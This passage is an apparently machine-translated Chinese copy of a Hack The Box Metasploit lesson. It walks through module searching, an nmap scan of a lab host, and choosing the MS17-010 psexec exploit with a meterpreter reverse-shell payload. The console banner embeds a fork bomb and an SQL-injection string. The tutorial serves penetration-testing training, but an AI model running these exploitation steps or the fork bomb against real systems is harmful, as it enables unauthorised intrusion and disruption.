class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">nswer77@htb[/htb]$ msfconsole</span><br><span class="line">                                                  </span><br><span class="line">                                              `:oDFo:`                            </span><br><span class="line">                                           ./ymM0dayMmy/.                          </span><br><span class="line">                                        -+dHJ5aGFyZGVyIQ==+-                    </span><br><span class="line">                                    `:sm⏣~~Destroy.No.Data~~s:`                </span><br><span class="line">                                 -+h2~~Maintain.No.Persistence~~h+-              </span><br><span class="line">                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          </span><br><span class="line">                          ./etc/shadow.0days-Data&#x27;%20OR%201=1--.No.0MN8&#x27;/.      </span><br><span class="line">                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    </span><br><span class="line">                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  </span><br><span class="line">                      :dopeAW.No&lt;nano&gt;o                     :is:TЯiKC.sudo-.A:  </span><br><span class="line">                      :we&#x27;re.all.alike&#x27;`                     The.PFYroy.No.D7:  </span><br><span class="line">                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    </span><br><span class="line">                      :msf&gt;exploit -j.                       :Ns.BOB&amp;ALICEes7:    </span><br><span class="line">                      :---srwxrwx:-.`                        `MS146.52.No.Per:    </span><br><span class="line">                      :&lt;script&gt;.Ac816/                        sENbove3101.404:    </span><br><span class="line">                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    </span><br><span class="line">                      :09.14.2011.raid                       /STFU|wall.No.Pr:    </span><br><span class="line">                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    </span><br><span class="line">                      :#OUTHOUSE-  -s:                       /corykennedyData:    </span><br><span class="line">                      :$nmap -oS                              SSo.6178306Ence:    </span><br><span class="line">                      :Awsm.da:                            /shMTl#beats3o.No.:    </span><br><span class="line">                      :Ring0:                             `dDestRoyREXKC3ta/M:    </span><br><span class="line">                      :23d:                               sSETEC.ASTRONOMYist:    </span><br><span class="line">                       /-                        /yo-    .ence.N:()&#123; :|: &amp; &#125;;:    </span><br><span class="line">                                                 `:Shall.We.Play.A.Game?tron/    </span><br><span class="line">                                                 ```-ooy.if1ghtf0r+ehUser5`    </span><br><span class="line">                                               ..th3.H1V3.U2VjRFNN.jMh+.`          </span><br><span class="line">                                              `MjM~~WE.ARE.se~~MMjMs              </span><br><span class="line">                                               +~KANSAS.CITY&#x27;s~-`                  </span><br><span class="line">                                                J~HAKCERS~./.`                    </span><br><span class="line">                                                .esc:wq!:`                        </span><br><span class="line">                                                 +++ATH`                            </span><br><span class="line">                                                  `</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.9-dev                           ]</span><br><span class="line">+ -- --=[ 2169 exploits - 1149 auxiliary - 398 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Use sessions -1 to interact with the last opened session</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure>

<p>或者，我们可以使用<code>-q</code>不显示横幅的选项。</p>
<p> 启动 MSF 控制台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure>

<p>为了更好地查看所有可用命令，我们可以键入命令<code>help</code>。首先，我们的工具需要锋利。我们需要做的第一件事就是确保构成框架的模块是最新的，并且可以导入任何可供公众使用的新模块。</p>
<p>旧方法是<code>msfupdate</code>在我们的 OS 终端（外部<code>msfconsole</code>）中运行。但是，<code>apt</code>包管理器目前可以毫不费力地处理模块和功能的更新。</p>
<h4 id="安装-MSF"><a href="#安装-MSF" class="headerlink" title="安装 MSF"></a>安装 MSF</h4><p> 安装 MSF</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo apt update &amp;&amp; sudo apt install metasploit-framework</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">(Reading database ... 414458 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../metasploit-framework_6.0.2-0parrot1_amd64.deb ...</span><br><span class="line">Unpacking metasploit-framework (6.0.2-0parrot1) over (5.0.88-0kali1) ...</span><br><span class="line">Setting up metasploit-framework (6.0.2-0parrot1) ...</span><br><span class="line">Processing triggers for man-db (2.9.1-1) ...</span><br><span class="line">Scanning application launchers</span><br><span class="line">Removing duplicate launchers from Debian</span><br><span class="line">Launchers are updated</span><br></pre></td></tr></table></figure>

<p>我们将在本模块中介绍的首要步骤之一是<code>exploit</code>为我们的<code>target</code>. 然而，在尝试任何利用之前，我们需要对自身有一个详细的了解<code>target</code>。这涉及<code>Enumeration</code>在任何类型的利用尝试之前的过程。</p>
<p>在 期间<code>Enumeration</code>，我们必须查看我们的目标并确定其上运行的是哪些面向公众的服务。例如，它是一个 HTTP 服务器吗？它是一个FTP服务器吗？它是 SQL 数据库吗？这些不同的<code>target</code>类型在现实世界中差别很大。我们需要从全面了解<code>scan</code>目标的 IP 地址开始，以确定正在运行的服务以及为每个服务安装的版本。</p>
<p>我们会注意到，在我们进行过程中，版本是该过程中的关键组件<code>Enumeration</code>，它将使我们能够确定目标是否易受攻击。以前易受攻击的服务的未修补版本或可公开访问的平台中的过时代码通常是我们进入系统的入口点<code>target</code>。</p>
<hr>
<h2 id="MSF-参与结构"><a href="#MSF-参与结构" class="headerlink" title="MSF 参与结构"></a>MSF 参与结构</h2><p>MSF 参与结构可分为五个主要类别。</p>
<ul>
<li>枚举</li>
<li>准备</li>
<li>开发</li>
<li>特权升级</li>
<li>开发后</li>
</ul>
<p>这种划分使我们更容易以更结构化的方式查找和选择适当的 MSF 功能，并相应地使用它们。这些类别中的每一个都有用于特定目的的不同子类别。这些包括，例如，服务验证和漏洞研究。</p>
<p>因此，我们熟悉这种结构至关重要。因此，我们将查看此框架的组件以更好地理解它们之间的关系。</p>
<p><img src="/.com//%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6%5C2.png"></p>
<p>我们将在本模块中逐一介绍这些类别，但我们建议您自己查看各个组件并深入挖掘。尝试不同的功能是学习新工具或技能不可或缺的一部分。因此，我们应该在接下来的实验室中尝试所有可以想象到的东西，并独立分析结果。</p>
<h2 id="模块-1"><a href="#模块-1" class="headerlink" title="模块"></a>模块</h2><p>正如我们之前提到的，Metasploit<code>modules</code>是具有特定目的和相应功能的准备脚本，这些脚本已经在野外开发和测试过。该<code>exploit</code>类别由所谓的概念验证 ( <code>POCs</code>) 组成，可用于以很大程度上自动化的方式利用现有漏洞。很多人常常认为，漏洞利用的失败证明了疑似漏洞的存在。然而，这只是证明 Metasploit 漏洞不起作用，并不能证明该漏洞不存在。这是因为许多漏洞需要根据目标主机进行定制才能使漏洞发挥作用。因此，诸如 Metasploit 框架之类的自动化工具只能被视为一种支持工具，不能替代我们的手动技能。</p>
<p>一旦进入<code>msfconsole</code>，我们就可以从包含所有可用 Metasploit 模块的广泛列表中进行选择。它们中的每一个都被组织成文件夹，如下所示：</p>
<h4 id="句法"><a href="#句法" class="headerlink" title="句法"></a>句法</h4><p> 句法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</span><br></pre></td></tr></table></figure>

<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p> 例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">794   exploit/windows/ftp/scriptftp_list</span><br></pre></td></tr></table></figure>

<h4 id="索引号"><a href="#索引号" class="headerlink" title="索引号"></a>索引号</h4><p>将显示标签<code>No.</code>以选择我们之后在搜索过程中想要的漏洞利用。稍后我们将看到<code>No.</code>标签对选择特定的 Metasploit 模块有多大帮助。</p>
<h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>标签<code>Type</code>是 Metasploit 之间的第一级隔离<code>modules</code>。查看此字段，我们可以知道此模块的代码段将完成什么。例如，其中一些<code>types</code>不能像模块那样直接使用。<code>exploit</code>但是，他们将在可交互的结构旁边引入结构，以实现更好的模块化。为了更好地解释，以下是该字段中可能出现的类型：</p>
<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>Auxiliary</code></td>
<td>扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。</td>
</tr>
<tr>
<td><code>Encoders</code></td>
<td>确保有效负载完好无损地到达目的地。</td>
</tr>
<tr>
<td><code>Exploits</code></td>
<td>定义为利用允许有效载荷传递的漏洞的模块。</td>
</tr>
<tr>
<td><code>NOPs</code></td>
<td>（无操作代码）在攻击尝试中保持负载大小一致。</td>
</tr>
<tr>
<td><code>Payloads</code></td>
<td>代码远程运行并回调攻击者机器以建立连接（或 shell）。</td>
</tr>
<tr>
<td><code>Plugins</code></td>
<td>附加脚本可以集成在一个评估中并<code>msfconsole</code>与之共存。</td>
</tr>
<tr>
<td><code>Post</code></td>
<td>用于收集信息、深入研究等的广泛模块。</td>
</tr>
</tbody></table>
<p>请注意，在选择用于有效载荷传输的模块时，该命令只能与以下可用作（或可交互模块）<code>use &lt;no.&gt;</code>的模块一起使用：<code>initiators</code></p>
<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>Auxiliary</code></td>
<td>扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。</td>
</tr>
<tr>
<td><code>Exploits</code></td>
<td>定义为利用允许有效载荷传递的漏洞的模块。</td>
</tr>
<tr>
<td><code>Post</code></td>
<td>用于收集信息、深入研究等的广泛模块。</td>
</tr>
</tbody></table>
<h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>该<code>OS</code>标记指定为哪个操作系统和体系结构创建模块。自然地，不同的操作系统需要运行不同的代码以获得期望的结果。</p>
<h4 id="servive"><a href="#servive" class="headerlink" title="servive"></a>servive</h4><p>该<code>Service</code>标签指的是目标机器上运行的易受攻击的服务。对于某些模块，例如 the<code>auxiliary</code>或<code>post</code>ones，此标记可以指更一般的活动<code>gather</code>，例如，指的是收集凭据。</p>
<h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p>最后，<code>Name</code>标签解释了使用为特定目的创建的模块可以执行的实际操作。</p>
<h2 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h2><p>Metasploit 还为现有模块提供完善的搜索功能。借助此功能，我们可以使用 specific 快速搜索所有模块，<code>tags</code>以找到适合我们目标的模块。</p>
<h4 id="MSF-搜索功能"><a href="#MSF-搜索功能" class="headerlink" title="MSF - 搜索功能"></a>MSF - 搜索功能</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help search</span><br><span class="line"></span><br><span class="line">Usage: search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]</span><br><span class="line"></span><br><span class="line">Prepending a value with &#x27;-&#x27; will exclude any matching results.</span><br><span class="line">If no options or keywords are provided, cached results are displayed.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -h                   Show this help information</span><br><span class="line">  -o &lt;file&gt;            Send output to a file in csv format</span><br><span class="line">  -S &lt;string&gt;          Regex pattern used to filter search results</span><br><span class="line">  -u                   Use module if there is one result</span><br><span class="line">  -s &lt;search_column&gt;   Sort the research results based on &lt;search_column&gt; in ascending order</span><br><span class="line">  -r                   Reverse the search results order to descending order</span><br><span class="line"></span><br><span class="line">Keywords:</span><br><span class="line">  aka              :  Modules with a matching AKA (also-known-as) name</span><br><span class="line">  author           :  Modules written by this author</span><br><span class="line">  arch             :  Modules affecting this architecture</span><br><span class="line">  bid              :  Modules with a matching Bugtraq ID</span><br><span class="line">  cve              :  Modules with a matching CVE ID</span><br><span class="line">  edb              :  Modules with a matching Exploit-DB ID</span><br><span class="line">  check            :  Modules that support the &#x27;check&#x27; method</span><br><span class="line">  date             :  Modules with a matching disclosure date</span><br><span class="line">  description      :  Modules with a matching description</span><br><span class="line">  fullname         :  Modules with a matching full name</span><br><span class="line">  mod_time         :  Modules with a matching modification date</span><br><span class="line">  name             :  Modules with a matching descriptive name</span><br><span class="line">  path             :  Modules with a matching path</span><br><span class="line">  platform         :  Modules affecting this platform</span><br><span class="line">  port             :  Modules with a matching port</span><br><span class="line">  rank             :  Modules with a matching rank (Can be descriptive (ex: &#x27;good&#x27;) or numeric with comparison operators (ex: &#x27;gte400&#x27;))</span><br><span class="line">  ref              :  Modules with a matching ref</span><br><span class="line">  reference        :  Modules with a matching reference</span><br><span class="line">  target           :  Modules affecting this target</span><br><span class="line">  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)</span><br><span class="line"></span><br><span class="line">Supported search columns:</span><br><span class="line">  rank             :  Sort modules by their exploitabilty rank</span><br><span class="line">  date             :  Sort modules by their disclosure date. Alias for disclosure_date</span><br><span class="line">  disclosure_date  :  Sort modules by their disclosure date</span><br><span class="line">  name             :  Sort modules by their name</span><br><span class="line">  type             :  Sort modules by their type</span><br><span class="line">  check            :  Sort modules by whether or not they have a check method</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  search cve:2009 type:exploit</span><br><span class="line">  search cve:2009 type:exploit platform:-linux</span><br><span class="line">  search cve:2009 -s name</span><br><span class="line">  search type:exploit -s type -r</span><br></pre></td></tr></table></figure>

<p>例如，我们可以尝试查找<code>EternalRomance</code>旧版 Windows 操作系统的漏洞。这可能看起来像这样：</p>
<h4 id="MSF-寻找永恒的浪漫"><a href="#MSF-寻找永恒的浪漫" class="headerlink" title="MSF - 寻找永恒的浪漫"></a>MSF - 寻找永恒的浪漫</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search eternalromance</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; search eternalromance type:exploit</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></pre></td></tr></table></figure>

<p>我们还可以使我们的搜索更粗略一些，并将其减少到一类服务。例如，对于 CVE，我们可以指定年份 ( <code>cve:&lt;year&gt;</code>)、平台 Windows ( <code>platform:&lt;os&gt;</code>)、我们要查找的模块类型 ( <code>type:&lt;auxiliary/exploit/post&gt;</code>)、可靠性等级 ( <code>rank:&lt;rank&gt;</code>) 和搜索名称 ( <code>&lt;pattern&gt;</code>)。这会将我们的结果缩减为仅符合上述所有条件的结果。</p>
<h4 id="MSF-特定搜索"><a href="#MSF-特定搜索" class="headerlink" title="MSF - 特定搜索"></a>MSF - 特定搜索</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search type:exploit platform:windows cve:2021 rank:excellent microsoft</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE</span><br><span class="line">   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE</span><br><span class="line">   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE</span><br></pre></td></tr></table></figure>

<h2 id="模块选择"><a href="#模块选择" class="headerlink" title="模块选择"></a>模块选择</h2><p>要选择我们的第一个模块，我们首先需要找到一个。假设我们有一个目标正在运行易受 EternalRomance (MS17_010) 攻击的 SMB 版本。我们发现扫描目标时SMB服务器端口445是开放的。</p>
<p> MSF - 特定搜索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ nmap -sV 10.10.10.40</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC</span><br><span class="line">Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Nmap scan report for 10.10.10.40</span><br><span class="line">Host is up (0.051s latency).</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds</span><br></pre></td></tr></table></figure>

<p>我们将启动<code>msfconsole</code>并搜索这个确切的漏洞名称。</p>
<h4 id="MSF-搜索-MS17-010"><a href="#MSF-搜索-MS17-010" class="headerlink" title="MSF - 搜索 MS17_010"></a>MSF - 搜索 MS17_010</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms17_010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br></pre></td></tr></table></figure>

<p>接下来，我们要为这个场景选择合适的模块。从<code>Nmap</code>扫描中，我们检测到 SMB 服务在版本 上运行<code>Microsoft Windows 7 - 10</code>。通过一些额外的操作系统扫描，我们可以猜测这是一个运行易受攻击的 SMB 实例的 Windows 7。然后我们继续选择模块以<code>index no. 2</code>测试目标是否易受攻击。</p>
<h2 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h2><p>在交互式模块中，我们可以指定几个选项。这些用于使 Metasploit 模块适应给定的环境。因为在大多数情况下，我们总是需要扫描或攻击不同的IP地址。因此，我们需要这种功能来设置我们的目标并对其进行微调。要检查在将漏洞发送到目标主机之前需要设置哪些选项，我们可以使用命令<code>show options</code>。在利用发生之前需要设置的所有内容都将<code>Yes</code>在该<code>Required</code>列下显示。</p>
<h4 id="MSF-选择模块"><a href="#MSF-选择模块" class="headerlink" title="MSF - 选择模块"></a>MSF - 选择模块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">msf6 &gt; use 0</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_psexec) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_psexec): </span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                          Required  Description</span><br><span class="line">   ----                  ---------------                          --------  -----------</span><br><span class="line">   DBGTRACE              false                                    yes       Show extra debug trace info</span><br><span class="line">   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction</span><br><span class="line">   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)</span><br><span class="line">   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check</span><br><span class="line">                         rdlists/named_pipes.txt</span><br><span class="line">   RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework</span><br><span class="line">                                                                            /wiki/Using-Metasploit</span><br><span class="line">   RPORT                 445                                      yes       The Target port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                           no        The service display name</span><br><span class="line">   SERVICE_NAME                                                   no        The service name</span><br><span class="line">   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no</span><br><span class="line">                                                                            rmal read/write folder share</span><br><span class="line">   SMBDomain             .                                        no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                        no        The password for the specified username</span><br><span class="line">   SMBUser                                                        no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure>

<p>在这里，我们<code>No.</code>可以看到标签有多大帮助。因为现在，我们不必在搜索中键入整个路径，而只需键入分配给 Metasploit 模块的编号。<code>info</code>如果我们想了解更多关于模块的信息，可以在选择模块后使用命令。这将为我们提供一系列对我们很重要的信息。</p>
<h4 id="MSF-模块信息"><a href="#MSF-模块信息" class="headerlink" title="MSF - 模块信息"></a>MSF - 模块信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 